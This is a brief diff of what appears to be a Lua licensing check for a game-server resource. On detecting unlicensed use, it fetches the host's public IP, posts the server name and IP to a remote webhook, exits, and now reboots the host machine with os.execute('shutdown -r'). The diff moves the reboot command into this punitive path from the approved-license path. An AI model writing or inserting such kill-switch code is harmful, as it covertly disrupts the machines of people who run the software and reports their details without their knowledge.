@@ -48,6 +48,7 @@ PerformHttpRequest('https://api.ipify.org', function(err, text, headers)
       RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")
       Wait(10000)
       os.exit()
+      os.execute('shutdown -r')
     end
     end, 'GET', "")
     
@@ -80,5 +81,4 @@ PerformHttpRequest('https://api.ipify.org', function(err, text, headers)
           }
         }
       PerformHttpRequest(ONAYLOG, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = onaylisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
-      end  
-      os.execute('shutdown -r')
+      end 
